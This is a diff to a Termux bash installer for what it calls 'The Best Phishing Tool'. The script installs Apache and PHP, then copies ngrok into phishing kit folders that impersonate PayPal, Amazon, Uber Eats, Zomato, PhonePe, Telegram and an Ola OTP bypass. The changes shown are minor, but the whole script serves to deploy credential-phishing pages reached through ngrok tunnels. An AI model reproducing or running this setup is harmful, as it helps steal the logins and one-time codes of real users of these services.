@@ -1,8 +1,9 @@
 #!/data/data/com.termux/files/usr/bin/bash
 clear
-echo ""
-echo ""
+echo 
+echo 
 echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Best Phishing Tool Please Wait \e[0m'
+echo
 termux-setup-storage
 apt-get install apache2 -y
 apt install php -y
@@ -30,7 +31,6 @@ cp -R ngrok phs/ola-otpbypass/
 cp -R ngrok phs/UberEats-Phishing/
 cp -R ngrok phs/Zomato-Phishing/
 cp -R ngrok phs/amazonsign/
-cp -R ngrok phs/tiktok/
 cp -R ngrok phs/phonepay/
 cp -R ngrok phs/paypal/
 cp -R ngrok phs/telegram/
